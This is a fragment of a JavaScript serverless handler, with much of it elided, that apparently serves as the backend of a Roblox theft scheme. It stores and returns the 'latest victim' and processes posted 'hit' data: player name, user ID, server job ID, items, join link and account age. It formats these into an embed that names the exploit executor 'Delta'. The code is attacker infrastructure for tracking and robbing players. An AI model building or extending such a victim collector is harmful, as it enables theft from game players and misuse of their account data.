export default async function handler(req, res) {
    ...
    // ========== STORE LATEST VICTIM ==========
    let latestVictim = null;
    
    // ========== GET REQUEST - Return latest victim ==========
    if (req.method === 'GET') {
        return res.status(200).json(latestVictim || { waiting: true });
    }
    
    // ========== POST REQUEST - Process victim data ==========
    let itemValues = {};
    try {
    ...
    try {
        ...
        const { player, userId, jobId, items, joinLink, accountAge, playerCount } = hitData;
        ...
        const embed = {
            ...
            fields: [
                ...
                { name: "📅 𝐚𝐠𝐞", value: accountAge ? accountAge + " days" : "?", inline: true },
                { name: "💻 𝐞𝐱𝐞𝐜𝐮𝐭𝐨𝐫", value: "Delta", inline: true },
                { name: "👥 𝐩𝐥𝐚𝐲𝐞𝐫𝐬", value: playerCount ? playerCount + "/12" : "?", inline: true },
        ...
        return res.status(200).json({ success: true, victim: latestVictim });
